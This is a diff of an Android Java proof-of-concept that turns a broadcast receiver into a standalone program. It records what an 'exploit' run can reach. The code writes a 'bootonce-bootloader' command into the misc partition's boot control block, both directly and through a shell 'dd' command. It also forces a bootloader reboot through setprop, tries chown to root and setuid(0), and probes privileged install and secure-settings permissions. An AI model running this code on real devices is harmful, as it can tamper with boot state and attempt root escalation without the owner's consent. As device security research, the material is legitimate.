@@ -1,8 +1,6 @@
+// Main.java - BCB & /data Write Verification (Pure Java, Os syscalls)
 package com.poc;
 
-import android.content.BroadcastReceiver;
-import android.content.Context;
-import android.content.Intent;
 import android.os.Process;
 import android.system.Os;
 import android.system.OsConstants;
@@ -18,19 +16,11 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
-public class Receiver extends BroadcastReceiver {
+public class Main {
 
     private static final String REPORT_PATH = "/cache/exploit_report.txt";
 
-    @Override
-    public void onReceive(Context context, Intent intent) {
-        if (!"com.poc.ACTION_START".equals(intent.getAction())) {
-            return;
-        }
-        runExploit();
-    }
-
-    private void runExploit() {
+    public static void main(String[] args) {
         StringBuilder report = new StringBuilder();
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
 
@@ -87,15 +77,15 @@ public class Receiver extends BroadcastReceiver {
                     "android.permission.INSTALL_PACKAGES",
                     "android.permission.DELETE_PACKAGES",
                     "android.permission.WRITE_SECURE_SETTINGS",
-                    "android.permission.REBOOT",   // keep for info, but we won't use reboot
+                    "android.permission.REBOOT",
                 };
                 for (String p : perms) {
                     try {
                         Method checkPerm = pm.getClass().getMethod("checkPermission", String.class, String.class, int.class);
                         int res = (int) checkPerm.invoke(pm, p, "com.poc", uid);
-                        report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
+                        report.append("checkPermission(").append(p).append(": ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
                     } catch (Exception e) {
-                        report.append("checkPermission(").append(p).append("): Error\n");
+                        report.append("checkPermission(").append(p).append(": Error\n");
                     }
                 }
             }
@@ -111,7 +101,6 @@ public class Receiver extends BroadcastReceiver {
                 FileDescriptor fd = null;
                 try {
                     fd = Os.open(path, OsConstants.O_RDWR | OsConstants.O_SYNC, 0644);
-                    // BCB command "bootonce-bootloader" (null terminated? We'll write as is)
                     byte[] data = "bootonce-bootloader".getBytes();
                     Os.lseek(fd, 0, OsConstants.SEEK_SET);
                     Os.write(fd, data, 0, data.length);
@@ -136,7 +125,7 @@ public class Receiver extends BroadcastReceiver {
             // 7b. Try writing via dd command (if /system/bin/dd exists)
             report.append("Write misc via dd command: ");
             try {
-                java.lang.Process p = Runtime.getRuntime().exec(
+                Process p = Runtime.getRuntime().exec(
                     new String[]{"/system/bin/sh", "-c",
                         "echo -n 'bootonce-bootloader' | /system/bin/dd of=/dev/block/by-name/misc bs=1024 count=1 conv=notrunc 2>/dev/null"
                     }
@@ -161,7 +150,7 @@ public class Receiver extends BroadcastReceiver {
             // 7d. Try to use setprop via command line
             report.append("setprop sys.powerctl reboot,bootloader: ");
             try {
-                java.lang.Process p = Runtime.getRuntime().exec(
+                Process p = Runtime.getRuntime().exec(
                     new String[]{"/system/bin/setprop", "sys.powerctl", "reboot,bootloader"}
                 );
                 int code = p.waitFor();
@@ -169,10 +158,6 @@ public class Receiver extends BroadcastReceiver {
             } catch (Exception e) {
                 report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
             }
-
-            // 7e. Try to write to /proc/cmdline? No, read-only.
-
-            // 7f. Try to change bootloader message via /sys/class/... maybe not.
 
             // --- [8] /data Write Verification (Various paths) ---
             report.append("\n--- /data Write Verification (Multiple paths) ---\n");
@@ -189,10 +174,8 @@ public class Receiver extends BroadcastReceiver {
                 FileDescriptor fd = null;
                 try {
                     File f = new File(path);
-                    // Ensure parent dir exists (some may not)
                     File parent = f.getParentFile();
                     if (parent != null && !parent.exists()) {
-                        // Try to create directory (might fail)
                         parent.mkdirs();
                     }
                     fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
@@ -200,7 +183,6 @@ public class Receiver extends BroadcastReceiver {
                     Os.fsync(fd);
                     Os.close(fd);
                     fd = null;
-                    // Try to delete
                     f.delete();
                     report.append("SUCCESS (write/delete)\n");
                 } catch (ErrnoException e) {
@@ -214,14 +196,13 @@ public class Receiver extends BroadcastReceiver {
                 }
             }
 
-            // --- [9] Additional system call tests (chown, chmod) ---
+            // --- [9] Additional system call tests (chown, setuid) ---
             report.append("\n--- Additional System Call Tests ---\n");
-            // Try chown on a file we created (if any)
+
             String testFile = "/cache/test_chown.tmp";
             try {
                 FileDescriptor fd = Os.open(testFile, OsConstants.O_WRONLY | OsConstants.O_CREAT, 0644);
                 Os.close(fd);
-                // Try to chown to root:root
                 Os.chown(testFile, 0, 0);
                 report.append("chown ").append(testFile).append(" 0:0: SUCCESS\n");
             } catch (ErrnoException e) {
@@ -232,7 +213,6 @@ public class Receiver extends BroadcastReceiver {
                 new File(testFile).delete();
             }
 
-            // Try setgid/setuid? Not possible without JNI? setuid is in Os? Actually Os.setuid exists.
             report.append("Os.setuid(0): ");
             try {
                 Os.setuid(0);
@@ -269,7 +249,7 @@ public class Receiver extends BroadcastReceiver {
 
     // --- Utilities ---
 
-    private void saveReport(String content) throws IOException {
+    private static void saveReport(String content) throws IOException {
         File reportFile = new File(REPORT_PATH);
         if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
         try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) {
@@ -280,7 +260,7 @@ public class Receiver extends BroadcastReceiver {
         } catch (Exception ignored) {}
     }
 
-    private String readFile(String path) {
+    private static String readFile(String path) {
         try {
             return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim();
         } catch (Exception e) {
@@ -288,7 +268,7 @@ public class Receiver extends BroadcastReceiver {
         }
     }
 
-    private String getProp(String key) {
+    private static String getProp(String key) {
         try {
             return (String) Class.forName("android.os.SystemProperties")
                     .getMethod("get", String.class, String.class)
@@ -298,7 +278,7 @@ public class Receiver extends BroadcastReceiver {
         }
     }
 
-    private String writeTestOs(String path) {
+    private static String writeTestOs(String path) {
         FileDescriptor fd = null;
         try {
             fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
@@ -319,7 +299,7 @@ public class Receiver extends BroadcastReceiver {
         }
     }
 
-    private String canExecute(String path) {
+    private static String canExecute(String path) {
         File f = new File(path);
         if (f.exists()) {
             return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
@@ -332,7 +312,7 @@ public class Receiver extends BroadcastReceiver {
         }
     }
 
-    private Object getService(String name) {
+    private static Object getService(String name) {
         try {
             Class<?> sm = Class.forName("android.os.ServiceManager");
             Method getService = sm.getMethod("getService", String.class);
@@ -349,7 +329,7 @@ public class Receiver extends BroadcastReceiver {
         }
     }
 
-    private Object getPackageManagerService() {
+    private static Object getPackageManagerService() {
         return getService("package");
     }
 }
